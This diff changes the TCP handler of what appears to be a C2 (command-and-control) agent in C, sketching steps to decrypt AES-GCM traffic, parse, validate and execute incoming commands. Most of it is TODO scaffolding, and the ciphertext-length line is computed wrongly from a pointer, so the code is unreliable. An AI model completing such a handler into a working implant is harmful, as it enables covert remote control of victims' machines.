@@ -8,8 +8,9 @@
 // TODO: all communication layers should be established here?
 // 		 tcp, http/s, dns, ssl/tls
 
-#include "cryptography/decrypt.h"
+#include "C2Profile.h"
 #include "encoders/decode.h"
+#include "cryptography/decrypt.h"
 
 /*
  * Order:
@@ -31,20 +32,30 @@
  * */
 
 
-int handleTCP(uint8_t* data)
+int handleTCP(uint8_t* rawData, Config* config)  // TODO: add InternalMessage var to store result?
 {
 	// Raw Bytes from Socket
-	uint8_t buf[4096];
+	uint8_t buf[4096]; // TODO: rename to plaintext?
 
 	// DECRYPT -> Decrypted Bytes
-	decrypt_aes_256_gcm(data, length(data), key, &buf, sizeof() ;
+	// [IV (12 bytes - cleartext)][Ciphertext (encrypted)][Tag (16 bytes - cleartext)]
+	const uint8_t* iv = rawData;
+	const uint8_t* ciphertext = rawData + 12;
+	size_t ciphertext_len = rawData - 12 - 16;
+	const uint8_t* tag = rawData + 12 + ciphertext_len;
+	decrypt_aes_256_gcm(ciphertext, ciphertext_len, config->crypto_key, iv, tag, buf);
 
 	// DESERIALIZE -> InternalMessage 
-	
+	// check length(plaintext) == sizeof(InternalMessage)
+    // const InternalMessage* msg = (const InternalMessage*)plaintext;
+	// VALIDATE
+    // size_t expected_size = offsetof(InternalMessage, data) + msg->data_len;
+    // check length(plaintext) == expected_size
 
 	// VALIDATE
 
 	// EXECUTE (InternalMessage)
+	// call function based on InternalMessage
 }
 
 
